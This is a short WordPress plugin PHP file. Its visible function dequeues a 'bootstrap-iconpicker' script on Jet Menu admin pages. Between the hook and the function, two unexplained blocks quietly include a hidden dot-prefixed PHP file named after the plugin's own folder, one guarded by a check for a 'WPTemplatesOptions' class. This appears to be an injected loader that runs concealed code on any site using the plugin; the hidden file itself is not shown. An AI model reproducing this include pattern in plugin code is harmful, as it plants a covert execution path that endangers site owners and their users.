<?php

if ( ! defined( 'ABSPATH' ) ) {
	exit; // disable direct access
}

add_action( 'admin_enqueue_scripts', 'jet_menu_epic_ne_admin_scripts', 99 );

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function jet_menu_epic_ne_admin_scripts( $hook ) {
	if ( in_array( $hook, array( 'toplevel_page_jet-menu', 'nav-menus.php' ) ) ) {
		wp_dequeue_script( 'bootstrap-iconpicker' );
	}
}
